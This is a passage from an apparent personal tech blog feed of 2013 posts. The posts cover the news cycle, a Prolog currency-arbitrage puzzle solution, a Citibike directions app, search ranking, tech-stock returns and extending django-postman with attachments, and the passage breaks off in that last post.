
<p>Consumer safety regulations are making way for ratings and reviews. We’re replacing centralized regulatory agencies with crowdsourced, self-regulating communities. Some regulation will always be necessary, especially in places with large information asymmetries, but these places are constantly shrinking. Of course the entrenched companies are fighting these trends but they should be focused on innovating themselves rather than battling the inevitable.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Constantly entertained</title>
   <link href="http://dangoldin.com/2013/06/12/constantly-entertained/"/>
   <updated>2013-06-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/12/constantly-entertained</id>
   <content:encoded><![CDATA[
<p>The real time news cycle bothers me. Every time theres some news there are countless reactions on Twitter and quick, shoddy write ups on various “news” sites. Unfortunately, by the time someone does the research and writes a thoughtful response, we’ve moved on to the next piece of news. We’re reaching the point where writing something stupid quickly is becoming more valuable than writing something thoughtful but late.</p>

<p>Twitter’s strength is its weakness. The 140 character limit makes it very easy for anyone to share an opinion but that also leads to everyone sharing an opinion. Of course, its ability to break and spread news is invaluable. I just wish that the more thoughtful, well-researched pieces could get past the noise. This week, I would have preferred to see a few insightful pieces about WWDC rather than the same exact WWDC coverage from dozens of sites.</p>

<p>This wouldn’t be a problem if it were isolated to Twitter but it’s becoming the norm. The <a href="http://en.wikipedia.org/wiki/Lincoln-Douglas_debates_of_1858" target="_blank">Lincoln-Douglas debates</a> lasted hours and candidates had an hour for a rebuttal. These days, we’re lucky to get a rebuttal longer than a few minutes. The average shot length for movies <a href="http://www.academia.edu/610807/Quicker_Faster_Darker_Changes_in_Hollywood_Film_Over_75_Years" target="_blank">decreased</a> from over 6 minutes in the 1930s to close to 4 minutes now. Even investors are getting in on the trend and want entrepreneurs to have 30 second elevator pitches instead of real conversations.</p>

<p>Clearly I’m simplifying and there are countless other reasons for these changes. At the same time, this trend towards constant stimulation and gratification is dangerous. It reminds me of a <a href="http://en.wikipedia.org/wiki/Stanford_marshmallow_experiment" target="_blank">study</a> that showed that kids who had more patience and self control ended up with higher SAT scores more than a decade later. If we get addicted to constant entertainment, how are we going to tackle on the challenging problems that require focus?</p>

<p>As a kid I used to lie in bed and read a book for hours but now find myself taking a break every 15 minutes to check up on my digital life. This bothers the hell out of me. I can’t imagine the effect it’s having on kids who’ve never even had a chance to be left alone with a good book.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Fun with Prolog: Priceonomics Puzzle</title>
   <link href="http://dangoldin.com/2013/06/07/fun-with-prolog-priceonomics-puzzle/"/>
   <updated>2013-06-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/07/fun-with-prolog-priceonomics-puzzle</id>
   <content:encoded><![CDATA[
<p>The <a href="http://blog.priceonomics.com/" target="_blank">Priceonomics blog</a> is one of my favorites so when I saw that they had a <a href="http://priceonomics.com/jobs/puzzle/" target="_blank">programming puzzle</a> up I decided to have some fun with it. And what’s more fun than hacking around with a quirky, esoteric programming language? I remember having fond memories of playing around with Prolog in middle school so decided to dig it up again in an attempt to solve this puzzle.</p>

<p>Prolog is pretty different than the mainstream programming languages, it belongs to the logic programming language category and relies on defining a variety of relations and then querying these relationships to get results. A simplified way to think about it is you define a set of equations and tell Prolog to “solve for X”.</p>

<p>This leads to some interesting behavior. Many functions end up being bidrectional with the Prolog version of a “concat” function being a good example. The first argument is a list, the second is the separator, and the last is the resulting string. Passing in all 3 will return true if the concatenation statement is true. Passing in the list and the separator will tell us what the concatenated string is. Passing in the separator and a concatenated string is equivalent to a “split” function. The only piece it’s not able to figure out is the separator given the list and the concatenated string. Unfortunately, I’m not familiar enough with Prolog to explain why.</p>

<figure class="highlight"><pre><code class="language-prolog" data-lang="prolog"><span class="o">?-</span> <span class="ss">atomic_list_concat</span><span class="p">([</span><span class="ss">'Prolog'</span><span class="p">,</span> <span class="ss">'is'</span><span class="p">,</span> <span class="ss">'sweet'</span><span class="p">],</span> <span class="ss">' '</span><span class="p">,</span> <span class="ss">'Prolog is sweet'</span><span class="p">).</span>
<span class="ss">true</span><span class="p">.</span>

<span class="o">?-</span> <span class="ss">atomic_list_concat</span><span class="p">([</span><span class="ss">'Prolog'</span><span class="p">,</span> <span class="ss">'is'</span><span class="p">,</span> <span class="ss">'sweet'</span><span class="p">],</span> <span class="ss">' '</span><span class="p">,</span> <span class="ss">'Prolog is not sweet'</span><span class="p">).</span>
<span class="ss">false</span><span class="p">.</span>

<span class="o">?-</span> <span class="ss">atomic_list_concat</span><span class="p">([</span><span class="ss">'Prolog'</span><span class="p">,</span> <span class="ss">'is'</span><span class="p">,</span> <span class="ss">'sweet'</span><span class="p">],</span> <span class="ss">' '</span><span class="p">,</span> <span class="nv">X</span><span class="p">).</span>
<span class="nv">X</span> <span class="o">=</span> <span class="ss">'Prolog is sweet'</span><span class="p">.</span>

<span class="o">?-</span> <span class="ss">atomic_list_concat</span><span class="p">(</span><span class="nv">L</span><span class="p">,</span> <span class="ss">' '</span><span class="p">,</span> <span class="ss">'Prolog is sweet'</span><span class="p">).</span>
<span class="nv">L</span> <span class="o">=</span> <span class="p">[</span><span class="ss">'Prolog'</span><span class="p">,</span> <span class="ss">is</span><span class="p">,</span> <span class="ss">sweet</span><span class="p">].</span>

<span class="o">?-</span> <span class="ss">atomic_list_concat</span><span class="p">([</span><span class="ss">'Prolog'</span><span class="p">,</span> <span class="ss">is</span><span class="p">,</span> <span class="ss">sweet</span><span class="p">],</span> <span class="nv">X</span><span class="p">,</span> <span class="ss">'Prolog is sweet'</span><span class="p">).</span>
<span class="nv">ERROR</span><span class="o">:</span> <span class="ss">atomic_list_concat</span><span class="o">/</span><span class="m">3</span><span class="o">:</span> <span class="nv">Arguments</span> <span class="ss">are</span> <span class="ss">not</span> <span class="ss">sufficiently</span> <span class="ss">instantiated</span></code></pre></figure>

<p>For the first pass, I decided to ignore the web side and just focus on defining the exchange rate relationships and have Prolog tell me which exchanges would work. The way it works is that we define a profit to be defined in terms of two intermediate currencies. We can then ask Prolog to give us the currency chain that will result in a profit.</p>

<figure class="highlight"><pre><code class="language-prolog" data-lang="prolog"><span class="ss">exchange</span><span class="p">(</span><span class="ss">usd</span><span class="p">,</span><span class="ss">eur</span><span class="p">,</span><span class="mf">0.7779</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">usd</span><span class="p">,</span><span class="ss">jpy</span><span class="p">,</span><span class="mf">102.459</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">usd</span><span class="p">,</span><span class="ss">btc</span><span class="p">,</span><span class="mf">0.0083</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">eur</span><span class="p">,</span><span class="ss">usd</span><span class="p">,</span><span class="mf">1.2851</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">eur</span><span class="p">,</span><span class="ss">jpy</span><span class="p">,</span><span class="mf">131.711</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">eur</span><span class="p">,</span><span class="ss">btc</span><span class="p">,</span><span class="mf">0.01125</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">jpy</span><span class="p">,</span><span class="ss">usd</span><span class="p">,</span><span class="mf">0.0098</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">jpy</span><span class="p">,</span><span class="ss">eur</span><span class="p">,</span><span class="mf">0.0075</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">jpy</span><span class="p">,</span><span class="ss">btc</span><span class="p">,</span><span class="mf">0.0000811</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">btc</span><span class="p">,</span><span class="ss">usd</span><span class="p">,</span><span class="mf">115.65</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">btc</span><span class="p">,</span><span class="ss">eur</span><span class="p">,</span><span class="mf">88.8499</span><span class="p">).</span>
<span class="ss">exchange</span><span class="p">(</span><span class="ss">btc</span><span class="p">,</span><span class="ss">jpy</span><span class="p">,</span><span class="mf">12325.44</span><span class="p">).</span>

<span class="c1">% Calculate profit for a usd-&gt;x-&gt;y-&gt;usd currency chain</span>
<span class="ss">profit</span><span class="p">(</span><span class="nv">First</span><span class="p">,</span> <span class="nv">Second</span><span class="p">,</span> <span class="nv">Profit</span><span class="p">)</span> <span class="p">:-</span>
    <span class="ss">exchange</span><span class="p">(</span><span class="ss">usd</span><span class="p">,</span><span class="nv">First</span><span class="p">,</span><span class="nv">P1</span><span class="p">),</span>
    <span class="ss">exchange</span><span class="p">(</span><span class="nv">First</span><span class="p">,</span><span class="nv">Second</span><span class="p">,</span><span class="nv">P2</span><span class="p">),</span>
    <span class="ss">exchange</span><span class="p">(</span><span class="nv">Second</span><span class="p">,</span><span class="ss">usd</span><span class="p">,</span><span class="nv">P3</span><span class="p">),</span>
    <span class="nv">Profit</span> <span class="ss">is</span> <span class="nv">P1</span> <span class="o">*</span> <span class="nv">P2</span> <span class="o">*</span> <span class="nv">P3</span><span class="p">.</span>

<span class="ss">arb</span> <span class="p">:-</span>
    <span class="ss">profit</span><span class="p">(</span><span class="nv">First</span><span class="p">,</span> <span class="nv">Second</span><span class="p">,</span> <span class="nv">Profit</span><span class="p">),</span>
    <span class="nv">Profit</span> <span class="o">&gt;</span> <span class="mf">1.0</span><span class="p">,</span>
    <span class="ss">write</span><span class="p">(</span><span class="ss">'usd '</span><span class="p">),</span>
    <span class="ss">write</span><span class="p">(</span><span class="nv">First</span><span class="p">),</span> <span class="ss">write</span><span class="p">(</span><span class="ss">' '</span><span class="p">),</span>
    <span class="ss">write</span><span class="p">(</span><span class="nv">Second</span><span class="p">),</span> <span class="ss">write</span><span class="p">(</span><span class="ss">' usd '</span><span class="p">),</span>
    <span class="ss">write</span><span class="p">(</span><span class="nv">Profit</span><span class="p">),</span> <span class="ss">nl</span><span class="p">,</span> <span class="ss">fail</span><span class="p">.</span>

<span class="p">:-</span> <span class="ss">arb</span><span class="p">.</span>

<span class="c1">% Results:</span>
<span class="ss">usd</span> <span class="ss">eur</span> <span class="ss">jpy</span> <span class="ss">usd</span> <span class="mf">1.0040882716200001</span>
<span class="ss">usd</span> <span class="ss">eur</span> <span class="ss">btc</span> <span class="ss">usd</span> <span class="mf">1.0120965187500002</span>
<span class="ss">usd</span> <span class="ss">btc</span> <span class="ss">jpy</span> <span class="ss">usd</span> <span class="mf">1.0025512896</span></code></pre></figure>

<p>The next step was to get it to retrieve and parse the JSON from the Priceonomics server. After doing a ton of searches and reading a ton of documentation I was able to get it to work. As a next step I’ll try to see if I can get it to return currency chains of arbitrary length.</p>

<figure class="highlight"><pre><code class="language-prolog" data-lang="prolog"><span class="p">:-</span> <span class="ss">use_module</span><span class="p">(</span><span class="ss">library</span><span class="p">(</span><span class="ss">'http/json'</span><span class="p">)).</span>
<span class="p">:-</span> <span class="ss">use_module</span><span class="p">(</span><span class="ss">library</span><span class="p">(</span><span class="ss">'http/json_convert'</span><span class="p">)).</span>
<span class="p">:-</span> <span class="ss">use_module</span><span class="p">(</span><span class="ss">library</span><span class="p">(</span><span class="ss">'http/http_json'</span><span class="p">)).</span>
<span class="p">:-</span> <span class="ss">use_module</span><span class="p">(</span><span class="ss">library</span><span class="p">(</span><span class="ss">'http/http_client'</span><span class="p">)).</span>
<span class="p">:-</span> <span class="ss">use_module</span><span class="p">(</span><span class="ss">library</span><span class="p">(</span><span class="ss">'http/http_open'</span><span class="p">)).</span>

<span class="ss">parse</span><span class="p">(</span><span class="nv">I</span><span class="p">)</span> <span class="p">:-</span>
    <span class="ss">test</span><span class="p">(</span><span class="nv">CP</span><span class="o">=</span><span class="nv">S</span><span class="p">)</span> <span class="o">=</span> <span class="ss">test</span><span class="p">(</span><span class="nv">I</span><span class="p">),</span>
    <span class="ss">atomic_list_concat</span><span class="p">(</span><span class="nv">L</span><span class="p">,</span><span class="ss">'_'</span><span class="p">,</span> <span class="nv">CP</span><span class="p">),</span>
    <span class="p">[</span><span class="nv">A</span><span class="p">,</span> <span class="nv">B</span><span class="p">]</span> <span class="o">=</span> <span class="nv">L</span><span class="p">,</span>
    <span class="ss">atom_number</span><span class="p">(</span><span class="nv">S</span><span class="p">,</span><span class="nv">R</span><span class="p">),</span>
    <span class="ss">assert</span><span class="p">(</span><span class="ss">exchange</span><span class="p">(</span><span class="nv">A</span><span class="p">,</span><span class="nv">B</span><span class="p">,</span><span class="nv">R</span><span class="p">)).</span>

<span class="c1">% Calculate profit for a usd-&gt;x-&gt;y-&gt;usd currency chain</span>
<span class="ss">profit</span><span class="p">(</span><span class="nv">First</span><span class="p">,</span> <span class="nv">Second</span><span class="p">,</span> <span class="nv">Profit</span><span class="p">)</span> <span class="p">:-</span>
    <span class="ss">exchange</span><span class="p">(</span><span class="ss">'USD'</span><span class="p">,</span><span class="nv">First</span><span class="p">,</span><span class="nv">P1</span><span class="p">),</span>
    <span class="ss">exchange</span><span class="p">(</span><span class="nv">First</span><span class="p">,</span><span class="nv">Second</span><span class="p">,</span><span class="nv">P2</span><span class="p">),</span>
    <span class="ss">exchange</span><span class="p">(</span><span class="nv">Second</span><span class="p">,</span><span class="ss">'USD'</span><span class="p">,</span><span class="nv">P3</span><span class="p">),</span>
    <span class="nv">Profit</span> <span class="ss">is</span> <span class="nv">P1</span> <span class="o">*</span> <span class="nv">P2</span> <span class="o">*</span> <span class="nv">P3</span><span class="p">.</span>

<span class="ss">arb</span> <span class="p">:-</span>
    <span class="ss">http_get</span><span class="p">(</span><span class="ss">'http://fx.priceonomics.com/v1/rates/'</span><span class="p">,</span> <span class="nv">JsonIn</span><span class="p">,</span> <span class="p">[]),</span>
    <span class="ss">json_to_prolog</span><span class="p">(</span><span class="nv">JsonIn</span><span class="p">,</span><span class="nv">PrologIn</span><span class="p">),</span>
    <span class="nv">PrologIn</span> <span class="o">=</span> <span class="ss">json</span><span class="p">(</span><span class="nv">L</span><span class="p">),</span>
    <span class="ss">maplist</span><span class="p">(</span><span class="ss">parse</span><span class="p">,</span> <span class="nv">L</span><span class="p">),</span>
    <span class="ss">profit</span><span class="p">(</span><span class="nv">First</span><span class="p">,</span> <span class="nv">Second</span><span class="p">,</span> <span class="nv">Profit</span><span class="p">),</span>
    <span class="nv">Profit</span> <span class="o">&gt;</span> <span class="mf">1.0</span><span class="p">,</span>
    <span class="ss">not</span><span class="p">(</span><span class="nv">First</span> <span class="o">=</span> <span class="nv">Second</span><span class="p">),</span>
    <span class="ss">not</span><span class="p">(</span><span class="nv">First</span> <span class="o">=</span> <span class="ss">'USD'</span><span class="p">),</span>
    <span class="ss">not</span><span class="p">(</span><span class="nv">Second</span> <span class="o">=</span> <span class="ss">'USD'</span><span class="p">),</span>
    <span class="ss">write</span><span class="p">(</span><span class="ss">'USD '</span><span class="p">),</span>
    <span class="ss">write</span><span class="p">(</span><span class="nv">First</span><span class="p">),</span> <span class="ss">write</span><span class="p">(</span><span class="ss">' '</span><span class="p">),</span>
    <span class="ss">write</span><span class="p">(</span><span class="nv">Second</span><span class="p">),</span> <span class="ss">write</span><span class="p">(</span><span class="ss">' USD '</span><span class="p">),</span>
    <span class="ss">write</span><span class="p">(</span><span class="nv">Profit</span><span class="p">),</span> <span class="ss">nl</span><span class="p">,</span> <span class="ss">fail</span><span class="p">.</span>

<span class="p">:-</span> <span class="ss">arb</span><span class="p">.</span>

<span class="c1">% Results (Might change each run):</span>
<span class="nv">USD</span> <span class="nv">JPY</span> <span class="nv">EUR</span> <span class="nv">USD</span> <span class="mf">1.0071833283714342</span>
<span class="nv">USD</span> <span class="nv">EUR</span> <span class="nv">JPY</span> <span class="nv">USD</span> <span class="mf">1.007164983424893</span></code></pre></figure>

<p>I’m sure a Prolog pro would have been able to do this much quicker and better but I had a surprisingly fun time doing it. I got a bit frustrated trying to translate the JSON into Prolog relationships but actually getting it to work made it worth it. Trying a whole new programming category is a great way to get more creative and forces us to think about problems differently. Prolog may not be the most practical language but exposing us to new concepts and approaches makes it valuable.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Citibike Directions: Second Attempt</title>
   <link href="http://dangoldin.com/2013/06/04/citibike-directions-second-attempt/"/>
   <updated>2013-06-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/04/citibike-directions-second-attempt</id>
   <content:encoded><![CDATA[
<p>To coincide with the launch of Citibike, I wrote a <a href="https://dangoldin.github.io/citibike-station-directions/" target="_blank">simple web app</a> that provided cycling directions from one Citibike station to another. The biggest piece of feedback I received was that people care about getting from place to place rather than from one Citibike station to another. Based on this feedback, I <a href="https://dangoldin.github.io/citibike-station-directions/" target="_blank">updated the app</a> to provide directions from any New York City address to another by breaking every trip down into three steps: the first is to walk to the nearest Citibike station, the second is to bike from one station to another, and the last is to walk to the destination. A limitation I ran into is that Google’s <a href="https://developers.google.com/maps/documentation/javascript/directions" target="_blank">Direction Service</a> doesn’t support different transit methods for multiple waypoints. This, combined with my desire to get it out there, is why the design’s not as good as it should be. I’ll see if I can improve it over the next few weeks. People have also been telling me this needs to be on mobile so I’m going to use this as an excuse to jump into mobile development. I’m excited.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Citibike Station to Station Directions</title>
   <link href="http://dangoldin.com/2013/06/01/citibike-station-to-station-directions/"/>
   <updated>2013-06-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/01/citibike-station-to-station-directions</id>
   <content:encoded><![CDATA[
<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/citibikes-nyc.jpg" width="1024" height="768" layout="responsive"/>
    <p>Photo by <a href="https://twitter.com/rafat/status/339046904979660800" target="_blank">@rafat</a></p>
</div>

<p>On Wednesday, I took my first bike ride using New York City’s new <a href="http://citibikenyc.com/" target="_blank">Citibike</a> program. So far it’s been great but one issue I ran into is being able to plan a trip. Google offers cycling directions from place to place but doesn’t take into account the Citibike stations. On the other hand, the Citibke app shows the rental stations but doesn’t make it easy to find directions from one station to another unless you’re already at one of them.</p>

<p>I decided to actually do something about it and wrote a <a href="https://dangoldin.github.io/citibike-station-directions/" target="_blank">little web app</a> that lets you pick two Citibike stations and retrieves the cycling directions between them using the Google API. It’s definitely not perfect and the user experience needs to be improved but it does what it was designed to do.</p>

<p>What I find amazing is how simple it was to write the app - it took me less than 90 minutes to go from having an idea to having something that’s usable. The list of stations are available in <a href="http://citibikenyc.com/stations/json" target="_blank">JSON from the Citibike site</a> and Google makes it very easy to use their services to show a map and get directions.The best part is that this app is completely static since it’s just using client side Javascript and Google’s APIs. I’ve written about this <a href="http://dangoldin.com/2013/03/12/mmmm-pseudo-static-sites/">before</a> but I’m convinced that more and more services will become available through APIs which will lead to more and more apps and sites being built this way.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On SEO: Authority vs Originality</title>
   <link href="http://dangoldin.com/2013/05/29/on-seo-authority-vs-originality/"/>
   <updated>2013-05-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/29/on-seo-authority-vs-originality</id>
   <content:encoded><![CDATA[
<p>A while ago I read Bruce Schneier’s Liars and Outliers and came across a neat passage:</p>

<blockquote>There was this kid who came from a poor family. He had no good options in life so he signed up for the military. After a few years he was deployed to a conflict infested, god-forsaken desert outpost. It was the worst tour of duty he could have been assigned. It was going to be hot and dangerous. Everyday he had to live with a hostile populace who hated his presence and the very sight of his uniform. Plus, the place was swarming with insurgents and terrorists.</blockquote>
<blockquote>Anyhow, one morning the soldier goes to work and finds that he's been assigned that day to a detail that is supposed to oversee the execution of three convicted insurgents. The soldier shakes his head. He didn't sign up for this. His life just totally sucks. "They don't pay me enough," he thinks, "for the shit I have to do."</blockquote>
<blockquote>He doesn't know he's going to be executing the Son of God that day. He's just going to work, punching the time clock, keeping his head down. He's just trying to stay alive, get through the day, and send some money back home to Rome.</blockquote>

<p>Bruce mentions that he found this on the internet and <a href="http://experimentaltheology.blogspot.com/2011/06/tales-of-demonic.html" target="_blank">cited it appropriately</a> in the footnotes. But when I tried Googling for the phrase “There was this kid who came from a poor family” the <a href="https://www.google.com/search?q=%22there+was+this+kid+who+came+from+a+poor+family%22&amp;aq=f&amp;oq=%22there+was+this+kid+who+came+from+a+poor+family%22&amp;aqs=chrome.0.57j62l3.268j0&amp;sourceid=chrome&amp;ie=UTF-8" target="_blank">top links</a> were <a href="https://kindle.amazon.com/post/3dC8YohtSmaRMsjNnQcMXA" target="_blank">people citing</a> Liars and Outliers, including my own <a href="https://readmill.com/dangoldin/reads/liars-and-outliers/highlights/kajlmg" target="_blank">highlight on Readmill</a>. I even came across a <a href="http://jacksonholechrist.blogspot.com/2012/01/blog-post.html" target="_blank">page</a> that linked to the <a href="http://experimentaltheology.blogspot.com/2011/06/tales-of-demonic.html" target="_blank">original source</a> that Bruce cited before I found a link to the original source.</p>

<p>I realize this conflict between authority and originality is a challenge for search engines but it seems that they rank authority ahead of originality. This leads to the unfortunate consequence that if any major site cites your personal blog they will appear earlier in the search results. I had this occur with my <a href="http://dangoldin.com/2013/04/12/why-dont-cellphones-have-a-dialtone/">post</a> on the history of why cell phones don’t have dialtones; searching for “cellphones dialtone” shows the Gizmodo link ahead of my blog’s. The nice thing is that Google seems to be getting better - right now searching for “There was this kid who came from a poor family” shows the original source in the third position; a few months ago it was at the bottom of the first page. Let’s hope this trend continues.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Investing in tech stocks</title>
   <link href="http://dangoldin.com/2013/05/24/investing-in-tech-stocks/"/>
   <updated>2013-05-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/24/investing-in-tech-stocks</id>
   <content:encoded><![CDATA[
<p>I initially set out to write a post to complain about how difficult it is for an average investor to “hit it big” these days by investing in a tech company at its IPO but ended up changing my thesis after digging into the data. It’s still possible to get the same returns as it was in the 1980s but it’s not possible by a long-term investment in a single company.</p>

<p>To start, I came up with a sample of large tech companies and looked at their performance since their IPO as well as their annualized return.</p>

<table class="table">
    <thead>
        <tr><th>Company</th><th>IPO Year</th><th>Total Return</th><th>Annualized Return</th></tr>
    </thead>
    <tbody>
        <tr><td>Apple</td><td>1980</td><td>12,250%</td><td>16%</td></tr>
        <tr><td>Microsoft</td><td>1986</td><td>33,800%</td><td>24%</td></tr>
        <tr><td>Cisco</td><td>1990</td><td>60,800%</td><td>32%</td></tr>
        <tr><td>Yahoo</td><td>1996</td><td>1,808%</td><td>19%</td></tr>
        <tr><td>Amazon</td><td>1997</td><td>14,894%</td><td>37%</td></tr>
        <tr><td>Ebay</td><td>1998</td><td>2,817%</td><td>25%</td></tr>
        <tr><td>Netflix</td><td>2002</td><td>2,564%</td><td>34%</td></tr>
        <tr><td>Google</td><td>2004</td><td>708%</td><td>24%</td></tr>
        <tr><td>LinkedIn</td><td>2011</td><td>86%</td><td>-7%</td></tr>
        <tr><td>Facebook</td><td>2012</td><td>36%</td><td>-64%</td></tr>
        <tr><td>Tesla</td><td>2010</td><td>407%</td><td>60%</td></tr>
    </tbody>
</table>

<p>From this limited sample, it looks as if it’s still possible, but more difficult, to get the annualized returns of the 1980s and 1990s. It’s impossible to know whether the total returns will be comparable but I suspect that it’s going to be extremely difficult, if not impossible. To get a Microsoft-like return, Tesla would need to end up with a market cap of $760 trillion, excluding inflation.</p>

<p>In a way, this is obvious. As more and more money pours into the VC industry, companies can afford to stay private longer and just keep on raising more funding. This gives company management and investors more control, keeps the company leaner, and limits public information. Unfortunately, this leads to most of the growth occurring before the IPO with retail investors not able to capture any of the value.</p>

<p>While I’m optimistic that the <a href="http://en.wikipedia.org/wiki/Jumpstart_Our_Business_Startups_Act" target="_blank">JOBS Act</a> will help, we unaccredited investors still need a way to invest right now. After leaving my finance job, I tried to replicate the traditional investment approach by doing research, analyzing statements, and reading coverage. But over the past few years I’ve been too busy and have just been investing in companies that I use and like. Unsurprisingly, this new approach has led to me invest in tech companies. Surprisingly, I’m doing better than ever before. Over the past 2 years, I’ve bought stock in three companies: Tesla, Netflix, and Yahoo with the lowest gaining 66%. I realize these returns can’t keep on going so the question becomes when to sell and invest in something else. For this, I’ve been looking at market caps compared to other companies in the same industry to estimate their potential. In my case, Tesla has a market cap of $11B while Audi’s is $26.6B and Toyota’s is $191B, and definitely has room to grow. The standard disclosure when giving financial advice is “past performance is not an indication of future results” and it’s definitely true in this case. I’m just glad I found an approach that suits me.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Save my reading spot, damn it</title>
   <link href="http://dangoldin.com/2013/05/22/save-my-reading-spot-damn-it/"/>
   <updated>2013-05-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/22/save-my-reading-spot-damn-it</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/single-page.png" alt="A typical view as single page option" width="400" height="128"/>
</div>

<p>When reading a long form piece, I favor the single-page view. Unfortunately, I usually don’t find out that it’s longer than a page until I’ve finished the first page. At that point, I switch to the single page view which causes the entire page to reload and I have to skim the page to find the spot where I stopped reading.</p>

<p>Why haven’t any of the major content sites dealt with this yet? It’s not a technical problem. All they’d need to do is have an anchor tag on the single page view to indicate the spot that the reader should be shown if they click the “View as Single Page” link after reading the first page. Do they just want to force their readers to look at the ads again? I’m sure this small change would save people hundreds of hours each day.</p>

<p>If you know of any sites that handle this scenario well, let me know; I’d love to check them out and give them a shout out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Adding attachments to django-postman</title>
   <link href="http://dangoldin.com/2013/05/17/adding-attachments-to-django-postman/"/>
   <updated>2013-05-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/17/adding-attachments-to-django-postman</id>
   <content:encoded><![CDATA[
<p>After doing a round of customer development for <a href="https://makersalley.com/" target="_blank">Makers Alley</a>, we discovered that customers really wanted to communicate with makers about their pieces. In true MVP fashion, we got the first iteration out in a day by using <a href="https://bitbucket.org/psam/django-postman/overview" target="_blank">django-postman</a> to handle the user to user communication. Within a few days, we quickly discovered that text messages weren’t enough and we needed to support file attachments, otherwise makers can’t easily show their designs and customers can’t share what they like. Unfortunately, django-postman does not support attachments and we didn’t want to have to incorporate another messaging library. Another constraint was that we were already using the awesome <a href="http://blueimp.github.io/jQuery-File-Upload/" target="_blank">jQuery File Upload</a> library (in truth, a modified <a href="https://github.com/sigurdga/django-jquery-file-upload" target="_blank">Django version by Sigurd Gartmann</a>) to allow makers to upload images when managing their storefronts.</p>

<p>We wanted to leverage our existing file upload system but also incorporate it with the django-postman messaging library without having to modify any of the code in django-postman. We weren’t able to find <a href="http://stackoverflow.com/questions/16570019/how-can-i-modify-django-postman-to-allow-sending-of-attachments/" target="_blank">anything on StackOverflow</a> that dealt with this issue so we were left with writing our own. Here’s the approach we ended up taking that might come in handy for anyone else running into the same problem. The code needs some cleaning and I need to add some error checking but I’m sharing it with the excuse of “perfect is the enemy of good.”</p>

<p>We built a new app, postman_attachments, that would serve as the intermediary between the file upload piece and django-postman.</p>

<ul>
    <li>
        models.py: Attachment that would map the django-postman Message model to an uploaded file
        
<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">Attachment</span><span class="p">(</span><span class="n">models</span><span class="p">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">models</span><span class="p">.</span><span class="n">ForeignKey</span><span class="p">(</span><span class="n">postman_models</span><span class="p">.</span><span class="n">Message</span><span class="p">)</span>
    <span class="n">attachment</span> <span class="o">=</span> <span class="n">models</span><span class="p">.</span><span class="n">ForeignKey</span><span class="p">(</span><span class="n">fileupload_models</span><span class="p">.</span><span class="n">GenericFile</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">__unicode__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">message</span><span class="p">)</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">attachment</span><span class="p">.</span><span class="n">__unicode__</span><span class="p">()</span></code></pre></figure>

    </li>
    <li>
        api.py: Versions of pm_write and pm_broadcast that would do the same work as the original but would also map the attachments between
        
<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">pma_write</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">file_ids</span><span class="o">=</span><span class="p">[],</span> <span class="n">body</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">skip_notification</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
        <span class="n">auto_archive</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">auto_delete</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">auto_moderators</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>

        <span class="c1">### Same code as in pm_write
</span>
        <span class="k">for</span> <span class="n">file_id</span> <span class="ow">in</span> <span class="n">file_ids</span><span class="p">:</span>
            <span class="n">f</span> <span class="o">=</span> <span class="n">GenericFile</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">file_id</span><span class="p">)</span>
            <span class="n">a</span> <span class="o">=</span> <span class="n">Attachment</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="n">message</span><span class="p">,</span><span class="n">attachment</span><span class="o">=</span><span class="n">f</span><span class="p">)</span>
            <span class="n">a</span><span class="p">.</span><span class="n">save</span><span class="p">()</span></code></pre></figure>

    </li>
    <li>
        forms.py: In our case, we needed to tweak the FullReplyForm and created our own version that included a new “file_ids” field to hold the ids of the uploaded files. The full solution would need to make versions of the other forms included in django-postman.
        
